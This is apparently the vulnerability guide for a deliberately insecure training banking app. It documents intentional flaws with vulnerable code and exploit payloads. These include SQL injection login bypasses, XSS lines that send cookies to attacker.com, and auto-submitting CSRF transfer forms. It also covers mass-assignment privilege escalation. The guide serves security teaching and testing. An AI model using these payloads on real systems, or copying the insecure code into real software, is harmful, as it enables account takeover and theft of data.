# RDFincorp Vulnerability Documentation

> ⚠️ This document details all intentional security vulnerabilities in the RDFincorp banking application.

## Table of Contents

1. [Insecure Direct Object References (IDOR)](#1-insecure-direct-object-references-idor)
2. [SQL Injection](#2-sql-injection)
3. [Cross-Site Scripting (XSS)](#3-cross-site-scripting-xss)
4. [Cross-Site Request Forgery (CSRF)](#4-cross-site-request-forgery-csrf)
5. [Broken Access Control](#5-broken-access-control)
6. [Sensitive Data Exposure](#6-sensitive-data-exposure)
7. [Weak Session Management](#7-weak-session-management)
8. [Mass Assignment](#8-mass-assignment)

---

## 1. Insecure Direct Object References (IDOR)

### Description
The application exposes direct references to internal objects (user IDs, card IDs, loan IDs) without proper authorization checks.

### Vulnerable Endpoints

#### 1.1 User Data Access
**Endpoint**: `GET /api/user/:userId`

**Vulnerability**: No authorization check - any authenticated user can view any other user's data

**Exploitation**:
```bash
# In BurpSuite, intercept request and modify userId parameter
GET /api/user/1 HTTP/1.1
# Change userId from 2 (your ID) to 1 (admin ID)
```

**Impact**: Full access to sensitive user data including passwords (plaintext), balance, credit score

#### 1.2 Transaction Access
**Endpoint**: `GET /api/transactions/:userId`

**Vulnerability**: View any user's transaction history

**Exploitation**:
```http
GET /api/transactions/1 HTTP/1.1
Cookie: connect.sid=...
```

**Impact**: Financial data leakage, transaction patterns revealed

#### 1.3 Credit Card Access
**Endpoint**: `GET /api/cards/:userId` and `GET /api/card/:cardId`

**Vulnerability**: Access any user's credit card details including CVV

**Exploitation with BurpSuite**:
1. Login as user (ID: 2)
2. Intercept request to `/api/cards/2`
3. Change to `/api/cards/1` (admin)
4. Receive full card details with CVV

**Impact**: Complete credit card data exposure

#### 1.4 Loan Data Access
**Endpoint**: `GET /api/loan/:loanId`

**Vulnerability**: Access any loan application details

**Exploitation**:
```http
GET /api/loan/1 HTTP/1.1
# Access loan details for any loanId
```

### Remediation (Not Implemented)
- Add authorization checks comparing `req.session.userId` with requested resource owner
- Implement proper access control middleware
- Use indirect references (tokens) instead of direct IDs

---

## 2. SQL Injection

### Description
Multiple endpoints use direct string concatenation for SQL queries without parameterization.

### Vulnerable Endpoints

#### 2.1 Login Form
**File**: `routes/auth.js` (Line ~15)

**Vulnerable Code**:
```javascript
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
```

**Exploitation - Authentication Bypass**:
```http
POST /auth/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=admin@rdfincorp.com' OR '1'='1' --&password=anything
```

**Alternative Payloads**:
```sql
-- Email field:
admin@rdfincorp.com' OR '1'='1' --
' OR 1=1 --
admin@rdfincorp.com'/*

-- Union-based:
' UNION SELECT id,email,password,full_name,account_number,balance,credit_score,is_admin,created_at FROM users WHERE '1'='1
```

#### 2.2 Search Functionality
**File**: `routes/api.js` (Line ~150)

**Vulnerable Code**:
```javascript
const searchQuery = `SELECT * FROM transactions WHERE notes LIKE '%${query}%'`;
```

**Exploitation - Data Extraction**:
```http
GET /api/search?query=' UNION SELECT id,email,password,full_name,account_number,balance,credit_score,is_admin FROM users-- HTTP/1.1
```

**Attack Chain**:
1. Extract user passwords
2. Extract account details
3. Enumerate all database tables
4. Complete database dump

### Impact
- Complete authentication bypass
- Full database access
- User credential theft
- Financial data extraction

### Remediation (Not Implemented)
- Use parameterized queries
- Implement ORM with query builders
- Input sanitization and validation

---

## 3. Cross-Site Scripting (XSS)

### Description
User input is not sanitized before rendering, allowing JavaScript injection.

### 3.1 Stored XSS

#### Loan Purpose Field
**File**: `routes/user.js` (Line ~85)

**Vulnerable Flow**:
1. User submits loan application
2. Purpose field stored without sanitization
3. Admin views application - XSS executes

**Exploitation**:
```html
<!-- In loan purpose field -->
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>

<!-- Or more sophisticated -->
<img src=x onerror="fetch('http://attacker.com/log?data=' + btoa(document.cookie))">
```

#### Transaction Notes
**Vulnerability**: Notes field in transfers not sanitized

**Exploitation**:
```javascript
// In transfer notes
<script>alert(document.cookie)</script>
<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie">
```

#### User Profile Name
**File**: `routes/api.js` (update-profile endpoint)

**Exploitation**:
```html
<script>
// Steal admin session when admin views user list
new Image().src='http://attacker.com/steal?admin='+document.cookie;
</script>
```

### 3.2 Reflected XSS

**Vulnerable**: Error messages displaying user input

**Exploitation**:
```http
GET /auth/login?error=<script>alert('XSS')</script> HTTP/1.1
```

### Impact
- Session hijacking
- Cookie theft
- Admin account takeover
- Malicious action execution

### Remediation (Not Implemented)
- HTML encoding of all user input
- Content Security Policy (CSP)
- Output sanitization
- Input validation

---

## 4. Cross-Site Request Forgery (CSRF)

### Description
No CSRF tokens implemented - all state-changing operations vulnerable.

### Vulnerable Operations

#### 4.1 Money Transfer
**File**: `routes/api.js` (Line ~100)

**Attack Page**:
```html
<!-- attacker-site.html -->
<html>
<body onload="document.getElementById('attack').submit()">
    <form id="attack" action="http://localhost:3000/api/transfer" method="POST">
        <input type="hidden" name="from_user_id" value="2">
        <input type="hidden" name="to_account" value="RDFC-1000-0000-0001">
        <input type="hidden" name="amount" value="10000">
        <input type="hidden" name="notes" value="CSRF transfer">
    </form>
</body>
</html>
```

#### 4.2 Loan Application
**Exploitation**:
```html
<img src="http://localhost:3000/user/apply-loan?amount=50000&purpose=hacked">
```

#### 4.3 Admin Approvals
**File**: `routes/admin.js`

**Attack**:
```html
<!-- Auto-approve all loans -->
<form action="http://localhost:3000/admin/approve-loan/1" method="POST">
    <input type="hidden" name="action" value="approve">
</form>
```

### Impact
- Unauthorized fund transfers
- Fraudulent loan approvals
- Account modifications
- Admin action hijacking

### Remediation (Not Implemented)
- Implement CSRF tokens
- Check request origin
- Require re-authentication for sensitive operations

---

## 5. Broken Access Control

### Description
Authorization checks are weak or missing entirely.

### Vulnerabilities

#### 5.1 Weak Admin Check
**File**: `routes/admin.js` (Line ~4)

**Vulnerable Code**:
```javascript
function checkAdmin(req, res, next) {
    if (req.session.isAdmin) {  // Only checks session variable
        next();
    }
}
```

**Exploitation**:
1. Register normal user
2. Use browser dev tools to modify cookie: `isAdmin=true`
3. Access `/admin/dashboard`

#### 5.2 Client-Side Role Checks
**Problem**: Role determined by cookie value

**Exploitation with BurpSuite**:
```http
GET /admin/dashboard HTTP/1.1
Cookie: userId=2; isAdmin=1
```

#### 5.3 No Authorization on API
**File**: `routes/api.js`

**Problem**: API endpoints don't verify user owns the resource

### Impact
- Privilege escalation
- Unauthorized admin access
- Complete system compromise

### Remediation (Not Implemented)
- Server-side role verification
- Check user permissions against database
- Implement proper RBAC (Role-Based Access Control)

---

## 6. Sensitive Data Exposure

### Description
Sensitive information stored and transmitted insecurely.

### Issues

#### 6.1 Plaintext Passwords
**File**: `routes/auth.js`, `init-db.js`

**Problem**: Passwords stored in plaintext in database

**Exploitation**:
```sql
-- Via SQL injection
' UNION SELECT password FROM users WHERE email='admin@rdfincorp.com'--
```

#### 6.2 CVV Exposure
**File**: `routes/api.js` (GET /api/cards/:userId)

**Problem**: API returns full CVV in responses

**Response**:
```json
{
    "card_number": "4532123456789012",
    "cvv": "123",  // Should never be returned
    "expiry_date": "12/27"
}
```

#### 6.3 Database Backup Endpoint
**File**: `routes/api.js` (Line ~175)

**Endpoint**: `GET /api/backup`

**Problem**: Publicly accessible endpoint exposing entire database

**Exploitation**:
```http
GET /api/backup HTTP/1.1
```

**Response**: All user data including passwords

### Impact
- Complete data breach
- Identity theft
- Financial fraud
- Compliance violations

### Remediation (Not Implemented)
- Hash passwords with bcrypt
- Never return/store CVV
- Remove debug/backup endpoints
- Encrypt sensitive data at rest

---

## 7. Weak Session Management

### Description
Session handling has multiple security issues.

### Vulnerabilities

#### 7.1 Insecure Session Configuration
**File**: `server.js` (Line ~25)

**Vulnerable Code**:
```javascript
app.use(session({
    secret: 'insecure-secret-key-123',  // Weak, hardcoded
    cookie: { 
        secure: false,      // Allows HTTP
        httpOnly: false,    // Accessible via JavaScript
        maxAge: null        // No expiration
    }
}));
```

**Exploitation**:
- XSS can steal cookies (httpOnly=false)
- Man-in-the-middle attacks (secure=false)
- Sessions never expire (maxAge=null)

#### 7.2 Session Fixation
**Problem**: Application accepts any session ID

**Exploitation**:
1. Attacker creates session
2. Sends link with session ID to victim
3. Victim authenticates
4. Attacker uses same session ID

#### 7.3 No Session Timeout
**Problem**: Sessions persist indefinitely

### Impact
- Session hijacking
- Session fixation attacks
- XSS-based cookie theft
- Long-term unauthorized access

### Remediation (Not Implemented)
- Strong, random secret
- Set `httpOnly: true`
- Set `secure: true` in production
- Implement session timeouts
- Regenerate session ID on login

---

## 8. Mass Assignment

### Description
Application accepts all request parameters without filtering.

### Vulnerabilities

#### 8.1 Registration Mass Assignment
**File**: `routes/auth.js` (Line ~50)

**Vulnerable Code**:
```javascript
let { email, password, full_name, is_admin, balance, credit_score } = req.body;
// Accepts is_admin, balance, credit_score from user input
```

**Exploitation**:
```http
POST /auth/register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=hacker@example.com&password=test123&full_name=Hacker&is_admin=1&balance=1000000&credit_score=850
```

**Result**: Create admin account with high balance and perfect credit

#### 8.2 Profile Update Mass Assignment
**File**: `routes/api.js` (Line ~180)

**Exploitation**:
```http
POST /api/update-profile HTTP/1.1
Content-Type: application/json

{
    "full_name": "John Doe",
    "is_admin": 1,
    "balance": 1000000,
    "credit_score": 850
}
```

### Impact
- Privilege escalation
- Balance manipulation
- Credit score modification
- Unauthorized admin creation

### Remediation (Not Implemented)
- Whitelist allowed parameters
- Separate admin-only fields
- Validate all input
- Use DTOs (Data Transfer Objects)

---

## Vulnerability Summary Table

| # | Vulnerability | Severity | Files Affected | Exploitation Difficulty |
|---|--------------|----------|----------------|------------------------|
| 1 | IDOR | High | routes/api.js | Easy |
| 2 | SQL Injection | Critical | routes/auth.js, routes/api.js | Easy |
| 3 | XSS | High | routes/user.js, routes/api.js | Medium |
| 4 | CSRF | High | All routes | Easy |
| 5 | Broken Access Control | Critical | routes/admin.js | Easy |
| 6 | Sensitive Data Exposure | Critical | Multiple | Easy |
| 7 | Weak Session Mgmt | High | server.js | Medium |
| 8 | Mass Assignment | Critical | routes/auth.js, routes/api.js | Easy |

---

## Testing Recommendations

1. **Use BurpSuite** for intercepting and modifying requests
2. **Test IDOR** by changing ID parameters in URLs
3. **Try SQL injection** on login and search forms
4. **Inject XSS** in all text input fields
5. **Test CSRF** by creating malicious HTML forms
6. **Attempt privilege escalation** via cookie manipulation
7. **Extract sensitive data** through various endpoints
8. **Chain vulnerabilities** for maximum impact

---

**Remember**: These vulnerabilities are INTENTIONAL for educational purposes. Never deploy this application in production environments.
